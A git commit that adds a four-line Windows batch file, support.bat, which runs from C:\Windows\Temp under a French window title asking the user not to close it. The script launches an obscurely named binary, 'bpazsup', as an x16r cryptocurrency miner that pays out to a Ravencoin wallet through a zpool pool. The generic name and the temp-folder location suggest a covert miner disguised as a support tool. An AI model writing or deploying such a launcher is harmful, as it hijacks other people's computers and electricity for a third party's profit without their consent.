da77429f2fc808c817af232ee95687bec886f019
Neyarito <99420322+Neyarito@users.noreply.github.com>
2022-05-27 02:34:21 +0200

    Add files via upload

---
+++ support.bat
@@ -0,0 +1,4 @@
+cd C:\Windows\Temp
+title Merci de ne pas fermer cette fenetre
+color 54
+bpazsup -a x16r -o stratum+tcp://x16r.eu.mine.zpool.ca:3636 -u RHVcfq9xqSK7Qwe63TitgkksSFQNufEkYC.bpazC -p c=RVN
